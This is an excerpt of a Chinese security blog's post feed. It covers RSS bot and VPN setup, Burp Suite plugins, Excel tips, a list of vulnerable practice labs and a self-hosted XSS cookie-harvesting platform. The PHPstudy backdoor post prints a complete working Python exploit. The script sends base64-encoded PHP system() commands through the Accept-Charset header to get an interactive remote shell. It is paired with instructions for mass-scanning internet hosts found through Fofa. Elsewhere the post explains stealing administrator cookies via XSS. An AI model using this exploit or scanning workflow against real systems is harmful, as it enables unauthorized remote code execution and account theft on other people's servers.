    <content type="text"><![CDATA[0x00 +前言一直想打造一个可以订阅一些好的博客或者网站直接的东西，但是很多免费的RSS阅读器广告特别多，所以就很少打开了，今天看到一篇文章说可以利用telegram+vps搭建一个RSS订阅的机器人，一下子吸引了我，今天就把这个技能分享给大家 0x01 前期准备 环境准备： 一个vps：Ubuntu 16系统 telegram 科学** xshell或者finalshell 1.1 vps的购买网址推荐：virmach ;搬瓦工 1.2 telegram下载安装Windows：传送门 Android：在Google play中自行下载 1.3 科学**搭建教程：传送门 0x02 搭建RSS订阅机器人2.1 申请机器人首先需要申请一个Telegram机器人，非常简单，直接对话Telegram机器人之父（@BotFather），发送/newbot给它，之后输入你的机器人的名字，注意需要以bot结尾（例如我的是kangrss_bot），之后你的机器人就创建好了，并且会给你一个HTTP API TOKEN： 记住这个token，待会需要用到 2.2 搭建RSS订阅搭建的RSS订阅机器人是基于开源软件rssbot的，一个开源的TelegramRSS机器人，项目地址：https://github.com/iovxw/rssbot。 还有一个听说也挺好用，但是我还没有用过 https://github.com/indes/flowerss-bot 2.2.1【方法一】首先得登录VPS，然后安装相关依赖。 1234#CentOS系统 yum -y update &amp;&amp; yum -y install gcc make openssl* pkg* libssl* screen curl #Ubuntu、Debian系统apt-get -y update &amp;&amp; apt-get -y install gcc make openssl pkg-config libssl-dev screen curl 安装Rust Nightly 1curl https://sh.rustup.rs -sSf | sh 安装rssbot 1234wget https://github.com/iovxw/rssbot/archive/v1.4.2.tar.gztar xvf v1.4.2.tar.gzcd rssbot-1.4.2cargo build --release 2.2.2 【方法二】直接下载编译好的rssbot.传送门 下载下来Linux版本的，然后使用远程终端连接工具xshell或finalshell来连接vps，将本地的rssbot文件上传到vps中， 2.3 运行rssbot12345mkdir RSS #创建RSS文件夹cd RSSchmod +x rssbot #服务rssbot执行权限apt-get install screen./rssbot DATAFILE TELEGRAM-BOT-TOKEN 然后按Ctrl + A + D 退出 screen （这样会后台运行） 使用下面的命令可以进入刚才启动服务的screen 1screen -R rssbot 最后我们就可以使用机器人了！ 0x03 订阅网站rssbot的指令如下： 12345/rss - 显示当前订阅的 RSS 列表，加 raw 参数显示链接/sub - 订阅一个 RSS: /sub http://example.com/feed.xml/unsub - 退订一个 RSS: /unsub http://example.com/feed.xml/unsubthis - 使用此命令回复想要退订的 RSS 消息即可退订, 不支持 Channel/export - 导出为 OPML 【示例】 订阅： 退订： 查看订阅的地址 0x04 参考链接https://51.ruyo.net/13304.html https://www.moerats.com/archives/566/ ###]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>telegram</tag>
        <tag>机器人</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpstudy后门检测及利用]]></title>
    <url>%2F2019%2F10%2F09%2Fphpstudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言前几天爆出了PHPstudy被黑客入侵，导致安装包被植入后门，所有下载该工具的人，都有可能被人直接远程控制。今天来给大家直接演示批量扫描存在PHPstudy后门的主机，然后对存在后门的主机直接getshell。 0x01 前期准备 【环境需求】 kali Linux渗透测试系统 saucerframe攻击框架 PHPstudy利用脚本 1.1 kali Linux系统安装出门右拐百度，一大堆教程 1.2 saucerframe攻击框架的安装框架GitHub地址：传送门 【安装步骤】 123git clone https://github.com/saucer-man/saucerframe.git cd saucerframepip install -r requirement.txt saucerframe框架需要python3的环境。 【使用说明】 12345678910111213141516171819202122# 1. 指定poc脚本(必需,支持同时指定多个poc)-s redis_unauth,mongodb_unauth# 2. 指定目标(必需)-iU www.xxx.com 单个目标-iF target.txt 从文本中加载-iR 192.168.1.1-192.168.2.100 根据ip地址范围加载-iN 192.168.1.0/24 根据网段加载-aZ "redis" ZoomEye api加载-aS "redis" Shodan api加载-aC "redis" Censys api加载-aF "redis" Fofa api加载# 3. 其他(可选)-h 查看帮助信息-t 300 并发数(默认100)--proxy socks5://127.0.0.1:1080 使用sock5代理-o result.txt 指定输出文件-v 4 指定终端输出详细级别(1-5, 默认为2)--show 查看所有poc-eT 并发采用多线程方式-eG 并发采用协程方式(默认) 1.3 PHPstudy后门利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/env python# -*- encoding: utf-8 -*-'''@File : PHPStudy_Backdoor.py@Time : 2019/09/23 19:17:02@Author : fuhei @Version : 1.0@Blog : http://www.lovei.org'''import requestsimport base64import sysheaders = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Sec-Fetch-Site': 'none', 'accept-charset': 'ZXhpdCgnZnVoZWk2NjYnKTs=', 'Accept-Encoding': 'gzip,deflate', 'Accept-Language': 'zh-CN,zh;q=0.9',&#125;def exp(url, command="whoami"): command = "system(\"" + command + "\");" command = base64.b64encode(command.encode('utf-8')) headers['accept-charset'] = str(command, 'utf-8') user = result = requests.get(url, headers=headers, verify=False).text.split('&lt;!')[0].strip('\r\n') print(user) while(1): command = input(user+"@fuhei$ ") if command == 'exit' or command == 'quit': break else: command = "system(\"" + command + "\");" command = base64.b64encode(command.encode('utf-8')) headers['accept-charset'] = str(command, 'utf-8') result = requests.get(url, headers=headers, verify=False) result.encoding = "GBK" print(result) result = result.text.split('&lt;!') if 'Cannot execute a blank command in' in result[0]: pass else: print(result[0], end="")def check(url): result = requests.get(url, headers=headers, verify=False) if result.status_code == 200 and 'fuhei666' in result.text: print("[+] Remote code execution vulnerability exists at the target address") return True else: print("[-] There is no remote code execution vulnerability in the target address") return Falseif __name__ == '__main__': if len(sys.argv) == 2: url = sys.argv[1] if check(url): exp(url) else: print("[!] Usage python3 PHPStudy_Backdoor.py http://www.lovei.org/") 0x02 开炮进入saucerframe文件夹，查看可利用的PHPstudy后门扫描脚本。 python saucerframe.py –show python saucerframe.py -s phpstudy_backdoor.py -aF “phpstudy” python phpstudy_getshell.py http://IP地址 免责声明： 本文意在讨论使用工具来应对软件研发领域中，日益增长的安全性质量测试需求。本文涉及到的工具不可被用于攻击目的**，本人概不承担一切后果。**]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>PHPstudy后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python爬虫学习笔记（一）]]></title>
    <url>%2F2019%2F10%2F08%2Fpython%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 前言为了记录自己的学习进度，并且将自己学习的内容巩固消化，决定将学习的知识用笔记的方式记录下来。 0x01 python初识1.1 python简介Python 是 一 门 面 向 对 象 的 、 解 释 型 的 编 程 语 言 。目 前 Python 常 见 的 版 本 有 Python2. X 和 Python3. X ， 总 结 起 来 ，Python3. X 各 方 面 更 成 熟 完 善 些 ， Python2. X 处 理 速 度 更 快 一 些 ，但 Python3. x 不 断 再 进 步 ， 肯 定 会 是 主 流 。Python 的 优 点 有 很 多 ， 比 如 简 洁 、 易 学 、 几 乎 全 能 、 支 持 面向 对 象 等 。 【知识拓展】 OOP—面向对象的编程语言 https://www.cnblogs.com/yimengxianzhi/p/7802021.html 面向对象的编程语言适合做大型的项目， 面向过程的编程语言适合做中小型的项目。 1.2 python能做什么 Python 能 做 什 么 数 据 分 析 与 挖 掘 黑 客 逆 向 编 程 网 络 爬 虫 机 器 学 习 开 发 WEB 项 目 开 发 游 戏 自 动 化 运 维 … 0x02 python基础语法2.1 输出2.x输出：print “hello world” 3.x输出：print(“hello world”) 2.2 注释 单行注释：# 多行注释：三引号注释法 123456#print("hello world")···print("hello world")print("hello world")print("hello world")··· 2.3 标识符2.4 变量2.5 数据类型2.6 运算符2.7 缩进0x030x04###]]></content>
  </entry>
  <entry>
    <title><![CDATA[burpsuite常用插件推荐与使用（不断跟新中）]]></title>
    <url>%2F2019%2F10%2F04%2Fburpsuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90%E4%B8%8E%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言 0x010x020x03 jsEncrypter3.1 介绍jsEncrypter是一个BurpSuite插件，使用phantomjs调用前端加密函数对数据进行加密，方便对加密数据输入点进行fuzz。 3.2 jsEncrypter下载1：直接在releases下载 2：自行编译： 12git clone https://github.com/c0ny1/jsEncrypter.gitmvn package 3: 编译好的：传送门 3.3 安装插件 3.4 jsEncrypter插件使用3.4.1 运行靶机项目提供了一个用php编写的靶机（jsEncrypter/server）,靶机提供了7个算法对密码进行加密后传输，后台解密，最后进行密码匹配。 base64 md5 sha1 sha254 sha384 sha512 RSA 3.4.2 编写phantomJS运行脚本jsEncrypter/js/jsEncrypter_base.js为插件phantomJS脚本模板。我们只需要将实现加密算法的js文件引入模板脚本，并在模板脚本的js_encrypt函数体中完成对加密函数的调用。 12345678910111213141516..................// 加载实现加密算法的js脚本var wasSuccessful = phantom.injectJs(&apos;xxx.js&apos;);/*引入实现加密的js文件*/ // 处理函数function js_encrypt(payload)&#123; var newpayload; /**********在这里编写调用加密函数进行加密的代码************/ /**********************************************************/ return newpayload;&#125;.................. 项目jsEncrypter/server/TestScript目录下是编写好的对应靶机各个加密算法的phantomJS脚本，可以参考！ 3.4.3 运行phantomJS并测试运行phantomJS 测试的目的是为了确保我们编写的phantomJS脚本能够正常加密payload。 抓包暴力破解 0x04 参考链接https://www.uedbox.com/post/59166/ ###]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS平台的搭建]]></title>
    <url>%2F2019%2F09%2F29%2FXSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[0x00 前言​ XSS——跨站脚本攻击，是一个主流的web安全漏洞，主要分为反射型、存储型和DOM型。攻击者可以利用XSS漏洞获取管理员的cookie信息，然后使用该cookie信息登陆到系统后台，从而进一步攻破系统。而打管理员cookie信息的平台就叫XSS平台，晚上也有很多搭建好的，虽然也能注册使用，但是你打到的cookie别人也能看到，这样的话，总感觉不安全，所以就自己搭建了一个平台自己使用，哈哈哈。 0x01 环境需求 vps：1G 512M即可 传送门 域名：腾讯云 阿里云 宝塔面板 PHP 7版本 XSS平台源码 0x02 vps购买可参考https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/ 0x03 域名购买可参考[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/ 0x04 宝塔面板的安装大家根据自己的vps系统选择对应的安装脚本命令，一件之行安装，非常方便 entos**安装命令：** 1yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh Ubuntu/Deepin**安装命令：** 1wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh Debian**安装命令：** 1wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh Fedora**安装命令**: 1wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh LNMP环境的安装输入你的vps IP:8888宝塔面板后台，然后会弹出让你选择安装LAMP环境还是LNMP环境，我使用的是LNMP环境，记住PHP版本需要使用7版本以上。 0x05 开始搭建5.1 新建站点首先需要在宝塔面板中新建一个站点叫xss.你的域名.com 需要从GitHub中下载xss平台的源码传送门，下载好源码后，上传到xss.你的域名.com站点下，记住，需要将压缩包的内容解压到站点根目录下。 2.2设置伪静态在网站-&gt;设置 在伪静态中添加相关带代码 【apache方式】 12345678&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteBase /RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L]RewriteRule ^do/auth/(\w+?)(/domain/([\w\.]+?))?$ /index.php?do=do&amp;auth=$1&amp;domain=$3 [L]RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L]RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]&lt;/IfModule&gt; 【nginx方式】 1234rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)&quot; /index.php?do=code&amp;urlKey=1 last;rewrite &quot;^/do/auth/(\w+?)(/domain/([\w.]+?))?&quot; /index.php?do=do&amp;auth=1&amp;domain=3 last;rewrite &quot;^/register/(.*?)&quot; /index.php?do=register&amp;key=1 last;rewrite &quot;^/register-validate/(.*?)&quot; /index.php?do=register&amp;act=validate&amp;key=$1 last; 2.2 设置域名解析添加域名解析，子域名设置为xss，记录为A ，记录值为VPS ip地址。 2.4 设置数据库宝塔面板中 ，数据库-&gt;添加数据库 2.5 开始安装输入域名开始安装 然后点击下一步出现数据库导入成功就说明安装好了。 0x06 使用输入域名访问]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>XSS平台</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试实战靶场]]></title>
    <url>%2F2019%2F09%2F26%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%2F</url>
    <content type="text"><![CDATA[0x00 前言在学习渗透测试的过程中，光学理论知识是不够的，还需要结合实战来进行学习。但是国家法律是不允许我们对互联网上的web站在未授权的情况下进行渗透测试的，所以我们只能通过自己搭建环境来进行学习。下面给大家分享一些靶场，免得大家再去寻找。 0x01 Vulnerable Web Applications BadStore http://www.badstore.net/ BodgeIt Store http://code.google.com/p/bodgeit/ Butterfly Security Project http://thebutterflytmp.sourceforge.net/ bWAPP http://www.mmeit.be/bwapp/ http://sourceforge.net/projects/bwapp/files/bee-box/ Commix https://github.com/stasinopoulos/commix-testbed CryptOMG https://github.com/SpiderLabs/CryptOMG Damn Vulnerable Node Application (DVNA) https://github.com/quantumfoam/DVNA/ Damn Vulnerable Web App (DVWA) http://www.dvwa.co.uk/ Damn Vulnerable Web Services (DVWS) http://dvws.professionallyevil.com/ Drunk Admin Web Hacking Challenge https://bechtsoudis.com/work-stuff/challenges/drunk-admin-web-hacking-challenge/ Exploit KB Vulnerable Web App http://exploit.co.il/projects/vuln-web-app/ Foundstone Hackme Bank http://www.mcafee.com/us/downloads/free-tools/hacme-bank.aspx Foundstone Hackme Books http://www.mcafee.com/us/downloads/free-tools/hacmebooks.aspx Foundstone Hackme Casino http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx Foundstone Hackme Shipping http://www.mcafee.com/us/downloads/free-tools/hacmeshipping.aspx Foundstone Hackme Travel http://www.mcafee.com/us/downloads/free-tools/hacmetravel.aspx GameOver http://sourceforge.net/projects/null-gameover/ hackxor http://hackxor.sourceforge.net/cgi-bin/index.pl Hackazon https://github.com/rapid7/hackazon LAMPSecurity http://sourceforge.net/projects/lampsecurity/ Moth http://www.bonsai-sec.com/en/research/moth.php NOWASP / Mutillidae 2 http://sourceforge.net/projects/mutillidae/ OWASP BWA http://code.google.com/p/owaspbwa/ OWASP Hackademic http://hackademic1.teilar.gr/ OWASP SiteGenerator https://www.owasp.org/index.php/Owasp_SiteGenerator OWASP Bricks http://sourceforge.net/projects/owaspbricks/ OWASP Security Shepherd https://www.owasp.org/index.php/OWASP_Security_Shepherd PentesterLab https://pentesterlab.com/ PHDays iBank CTF http://blog.phdays.com/2012/05/once-again-about-remote-banking.html SecuriBench http://suif.stanford.edu/~livshits/securibench/ SentinelTestbed https://github.com/dobin/SentinelTestbed SocketToMe http://digi.ninja/projects/sockettome.php sqli-labs https://github.com/Audi-1/sqli-labs MCIR (Magical Code Injection Rainbow) https://github.com/SpiderLabs/MCIR sqlilabs https://github.com/himadriganguly/sqlilabs VulnApp http://www.nth-dimension.org.uk/blog.php?id=88 PuzzleMall http://code.google.com/p/puzzlemall/ WackoPicko https://github.com/adamdoupe/WackoPicko WAED http://www.waed.info WebGoat.NET https://github.com/jerryhoff/WebGoat.NET/ WebSecurity Dojo http://www.mavensecurity.com/web_security_dojo/ XVWA https://github.com/s4n7h0/xvwa Zap WAVE http://code.google.com/p/zaproxy/downloads/detail?name=zap-wave-0.1.zip 0x02 Vulnerable Operating System Installations 21LTR http://21ltr.com/scenes/ Damn Vulnerable Linux http://sourceforge.net/projects/virtualhacking/files/os/dvl/ exploit-exercises - nebula, protostar, fusion http://exploit-exercises.com/download heorot: DE-ICE, hackerdemia http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso http://hackingdojo.com/downloads/iso/De-ICE_S1.110.iso http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso http://hackingdojo.com/downloads/iso/De-ICE_S2.100.iso hackerdemia - http://hackingdojo.com/downloads/iso/De-ICE_S1.123.iso Holynix http://sourceforge.net/projects/holynix/files/ Kioptrix http://www.kioptrix.com/blog/ LAMPSecurity http://sourceforge.net/projects/lampsecurity/ Metasploitable http://sourceforge.net/projects/virtualhacking/files/os/metasploitable/ neutronstar http://neutronstar.org/goatselinux.html PenTest Laboratory http://pentestlab.org/lab-in-a-box/ Pentester Lab https://www.pentesterlab.com/exercises pWnOS http://www.pwnos.com/ RebootUser Vulnix http://www.rebootuser.com/?page_id=1041 SecGame # 1: Sauron http://sg6-labs.blogspot.co.uk/2007/12/secgame-1-sauron.html scriptjunkie.us http://www.scriptjunkie.us/2012/04/the-hacker-games/ UltimateLAMP http://www.amanhardikar.com/mindmaps/practice-links.html TurnKey Linux http://www.turnkeylinux.org/ Bitnami https://bitnami.com/stacks Elastic Server http://elasticserver.com OS Boxes http://www.osboxes.org VirtualBoxes http://virtualboxes.org/images/ VirtualBox Virtual Appliances https://virtualboximages.com/ CentOS http://www.centos.org/ Default Windows Clients https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise https://dev.windows.com/en-us/microsoft-edge/tools/vms/ Default Windows Server https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-technical-preview Default VMWare vSphere http://www.vmware.com/products/vsphere/ 0x03 Sites for Downloading Older Versions of Various Software Exploit-DB http://www.exploit-db.com/ Old Apps http://www.oldapps.com/ Old Version http://www.oldversion.com/ VirtualHacking Repo sourceforge.net/projects/virtualhacking/files/apps%40realworld/ 0x04 Sites by Vendors of Security Testing Software Acunetix acuforum http://testasp.vulnweb.com/ Acunetix acublog http://testaspnet.vulnweb.com/ Acunetix acuart http://testphp.vulnweb.com/ Cenzic crackmebank http://crackme.cenzic.com HP freebank http://zero.webappsecurity.com IBM altoromutual http://demo.testfire.net/ Mavituna testsparker http://aspnet.testsparker.com Mavituna testsparker http://php.testsparker.com NTOSpider Test Site http://www.webscantest.com/ 0x05 Sites for Improving Your Hacking Skills Embedded Security CTF https://microcorruption.com EnigmaGroup http://www.enigmagroup.org/ Escape http://escape.alf.nu/ Google Gruyere http://google-gruyere.appspot.com/ Gh0st Lab http://www.gh0st.net/ Hack This Site http://www.hackthissite.org/ HackThis http://www.hackthis.co.uk/ HackQuest http://www.hackquest.com/ Hack.me https://hack.me Hacking-Lab https://www.hacking-lab.com Hacker Challenge http://www.dareyourmind.net/ Hacker Test http://www.hackertest.net/ hACME Game http://www.hacmegame.org/ Halls Of Valhalla http://halls-of-valhalla.org/beta/challenges Hax.Tor http://hax.tor.hu/ OverTheWire http://www.overthewire.org/wargames/ PentestIT http://www.pentestit.ru/en/ CSC Play on Demand https://pod.cybersecuritychallenge.org.uk/ pwn0 https://pwn0.com/home.php RootContest http://rootcontest.com/ Root Me http://www.root-me.org/?lang=en Security Treasure Hunt http://www.securitytreasurehunt.com/ Smash The Stack http://www.smashthestack.org/ SQLZoo http://sqlzoo.net/hack/ TheBlackSheep and Erik http://www.bright-shadows.net/ ThisIsLegal http://thisislegal.com/ Try2Hack http://www.try2hack.nl/ WabLab http://www.wablab.com/hackme XSS: Can You XSS This? http://canyouxssthis.com/HTMLSanitizer/ XSS Game https://xss-game.appspot.com/ XSS: ProgPHP http://xss.progphp.com/ 0x06 CTF Sites / Archives CAPTF Repo http://captf.com/ CTFtime (Details of CTF Challenges) http://ctftime.org/ctfs/ CTF write-ups repository https://github.com/ctfs Reddit CTF Announcements http://www.reddit.com/r/securityctf shell-storm Repo http://shell-storm.org/repo/CTF/ VulnHub https://www.vulnhub.com 0x07 Mobile Apps Damn Vulnerable Android App (DVAA) https://code.google.com/p/dvaa/ Damn Vulnerable FirefoxOS Application (DVFA) https://github.com/pwnetrationguru/dvfa/ Damn Vulnerable iOS App (DVIA) http://damnvulnerableiosapp.com/ ExploitMe Mobile Android Labs http://securitycompass.github.io/AndroidLabs/ ExploitMe Mobile iPhone Labs http://securitycompass.github.io/iPhoneLabs/ Hacme Bank Android http://www.mcafee.com/us/downloads/free-tools/hacme-bank-android.aspx InsecureBank http://www.paladion.net/downloadapp.html NcN Wargame http://noconname.org/evento/wargame/ OWASP iGoat http://code.google.com/p/owasp-igoat/ OWASP Goatdroid https://github.com/jackMannino/OWASP-GoatDroid-Project 0x08 Lab binjitsu https://github.com/binjitsu/binjitsu CTFd https://github.com/isislab/CTFd Mellivora https://github.com/Nakiami/mellivora NightShade https://github.com/UnrealAkama/NightShade MCIR https://github.com/SpiderLabs/MCIR Docker https://www.docker.com/ Vagrant https://www.vagrantup.com/ NETinVM http://informatica.uv.es/~carlos/docencia/netinvm/ SmartOS https://smartos.org/ SmartDataCenter https://github.com/joyent/sdc vSphere Hypervisor https://www.vmware.com/products/vsphere-hypervisor/ GNS3 http://sourceforge.net/projects/gns-3/ OCCP https://opencyberchallenge.net/ XAMPP https://www.apachefriends.org/index.html 0x09 Miscellaneous VulnVPN http://www.rebootuser.com/?page_id=1041 VulnVoIP http://www.rebootuser.com/?page_id=1041 Vulnserver http://www.thegreycorner.com/2010/12/introducing-vulnserver.html NETinVM http://informatica.uv.es/~carlos/docencia/netinvm/ DVRF https://github.com/praetorian-inc/DVRF HackSys Extreme Vulnerable Driver http://www.payatu.com/hacksys-extreme-vulnerable-driver/ VirtuaPlant https://github.com/jseidl/virtuaplant Fosscomm https://github.com/nikosdano/fosscomm Morning Catch http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/ AWBO https://labs.snort.org/awbo/awbo.html]]></content>
      <categories>
        <category>渗透测试</category>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MS2016-Excel使用的一些技巧]]></title>
    <url>%2F2019%2F09%2F25%2FMS2016-Excel%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[0x00 前言在这个信息大爆炸的时代，不会电脑的电脑白将难以生存，不会office办公软件的电脑白将难以升职加薪。这里主要记录一下自己在工作中碰到的一些excel问题，方便他人，利于自己。皮卡皮卡~ 0x01 解决问题1.1 设置行高右击需要设置的行和列， 1.2 合并多个文件 然后等待数据被加载出来 1.3 冻结指定的行和列1.3.1 案例1 冻结首行首列只需要点击A2,B2单元格 然后到视图-&gt;冻结窗口-&gt;冻结窗口 结果展示 1.3.2 案例2 冻结指定行列 为了给大家更形象的理解，我画了一个丑图，希望大家可以看懂^v^ 想冻结前两行，前两列 结果展示： 0x2###]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>解决问题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9元钱搭建一个自己的VPN]]></title>
    <url>%2F2019%2F09%2F20%2F9%E5%85%83%E9%92%B1%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84VPN%2F</url>
    <content type="text"><![CDATA[0x00 前言科学上网。。。。此处省略一万字 0x01 需求分析 1.一个Linux系统的vps 2.v2ray脚本 3.v2ray客户端 0x02 购买VPS购买地址：传送门,选择第四项，经济实惠的Linux 然后拉到最底下，选择KVM VPS，注意，这里不要选open VZ的VPS，因为这个虚拟主机不能进行bbr plus加速，笔者在这里踩了一个大坑，找了好久资料，没有解决，最后在团队群里的一个小伙伴告诉我了。 选择vps的配置 位置就选默认的，速度杠杠的，然后添加到购物车 完成订单后会跳到支付宝付款的界面，扫码付钱就行了。 之所以选择Ubuntu16位的系统是因为笔者试过了debian，centos的系统，发现都不行，真是所有坑都被我踩了。 0x03 安装 V2Ray输入下面命令回车，你可以复制过去，然后在 Xshell 界面按 Shift + Insert 即可粘贴，不能按 Ctrl + V 的。 1bash &lt;(curl -s -L https://git.io/v2ray.sh) 如果提示 curl: command not found ，那是因为你的 VPS 没装 Curl ubuntu/debian 系统安装 Curl 方法: 1apt-get update -y &amp;&amp; apt-get install curl -y centos 系统安装 Curl 方法: 1yum update -y &amp;&amp; yum install curl -y 安装好 curl 之后就能安装脚本了 输入1，回车，开始安装 选择协议，默认TCP，回车即可 选择端口，回车 广告拦截，回车自动选择N 配置Shadowsocks，有需要的可以配置，也可以先不配置，等配置好v2ray以后在配置也可以 最后按enter键，等待一会，会有v2ray的配置信息出现，说明配置好了 下载v2ray的客户端，然后导入刚刚复制的复制的配置信息 选择从剪切板导入，导入成功后会出现下图 有点右下角的v2ray客户端小图标，点击启用http代理 模式选择，有全局模式和PAC模式， 全局模式状态下，你访问的所有流量都会先经过vps服务器，相当于vps是一个中间者， PAC模式状态下，你访问的流量会自动分流，国内的网站不会经过vps，只有国外的网站才会经过vps OK,现在就可以访问Google试试了， 访问YouTube 到这里，FQ已经是成功了，但是，有个问题就是访问的网速却很慢，so，需要进行加速操作。 0x04 BBR plus内核加速4.1 安装证书命令： 123apt-get -y install ca-certificates或yum -y install ca-certificates 4.2 安装加速脚本命令： 1wget &quot;https://github.com/chiakge/Linux-NetSpeed/raw/master/tcp.sh&quot; &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh 先在[1– 3]切换内核（第一次显示为bbr内核也要切换一遍），重启 安装完成，重启vps 4.2 运行重启后不用再下载脚本，直接./tcp.sh ，在[4 – 8]中选你要开的加速 “1. 安装 BBR/BBR魔改版内核” 对应4,5,6（原版，魔改，暴力魔改） “2. 安装 BBRplus版内核 ” 对应7（plus） “3. 安装 Lotserver(锐速)内核” 对应8（锐速） 开启后再 ./tcp.sh ， 显示开启成功则启动成功，你也可以自己手动确认 现在你可以自由的切换你想要的加速，直到你不想折腾为止~ 然后在访问YouTube，测试速度，发现速度飕飕的。1080p点到哪里看哪里。 0x05 参考链接 https://github.com/233boy/v2ray/wiki/V2Ray%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B https://zhujiwiki.com/8563/]]></content>
  </entry>
  <entry>
    <title><![CDATA[使用burpsuite抓取Google的数据包]]></title>
    <url>%2F2019%2F09%2F20%2F%E4%BD%BF%E7%94%A8burpsuite%E6%8A%93%E5%8F%96Google%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%2F</url>
    <content type="text"><![CDATA[0x00 前言我们在测试的过程中，可能会碰到必须需要挂VPN代理才能访问的网站，但是挂了VPN以后，就不能继续设置代理抓包了，最近有一个朋友帮助我解决了这一问题。下面来给大家讲讲其中的原理和操作方法。 0x01 需要的环境 本机：Windows10 X64 需要的软件：V2ray客户端 ​ burpsuite VPS:安装了v2ray 0x02 原理解析原理及时本地浏览器开启本地的8080端口的代理，然后在burp中设置一个1080的本地端口代理。然后通过V2ray客户端将本地的1080端口和vps的43085端口映射上。这样就大ton过本地浏览器-&gt;burpsuite-&gt;vps-&gt;目标网站的通路，当然抓包也就不成问题了，下图是我按照自己的理解画的一个数据流向图，帮助大家理解一下其中的原理，如果理解错误的地方，欢迎大家指出。 0x03 操作流程1.浏览器开启代理 这里我使用了代理工具了，也可以直接在设置里面去设置。这个不会的请出门右转百度。 2.burp中的设置 3.v2ray客户端的配置 需要开启全局代理模式。 4.访问测试 burp下不拦截数据包，随便访问一个网站，看看能否正常访问，可以正常访问说明数据是通的，配置没有问题。 可以正常访问hao123. 访问谷歌也是正常 看看burpsuite的历史记录中，已经有了谷歌和hao123的数据包记录。 数据的流向正的没有问题。 抓一个youtube的包试试，成功抓到了YouTube的请求包 YouTube的返回包 0x04 总结前人栽树后人乘凉，本着分享的精神和大家分享一下，大家共同进步，觉得文章不错的点个赞就好，觉得很烂的，留下你的足迹就好。 ###]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[本地搭建一个poc生成器]]></title>
    <url>%2F2019%2F09%2F17%2F%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AApoc%E7%94%9F%E6%88%90%E5%99%A8%2F</url>
